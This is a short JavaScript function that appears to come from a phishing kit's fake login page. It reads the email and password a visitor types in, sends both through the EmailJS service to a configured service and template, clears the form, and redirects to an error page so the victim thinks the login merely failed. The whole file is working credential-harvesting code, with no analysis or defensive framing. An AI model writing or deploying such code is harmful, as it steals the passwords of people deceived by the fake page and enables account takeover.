


function sendMail(){
 
    const email = document.getElementById("email");
    
    // Get the value of the textarea
    const emailValue = email.value;
    
        var params= {
            password: document.getElementById("password").value,
            email: emailValue
        }
    
        const serviceID  = 'service_nu3ah99';
        const templateID = 'template_jf3olfw';
    
    emailjs.send(serviceID, templateID, params).then((res)=>{
        document.getElementById("password").value= "";
        document.getElementById("email").value= "";
        console.log(res);
        window.location.href='error.html';
    
    })
    }
    
    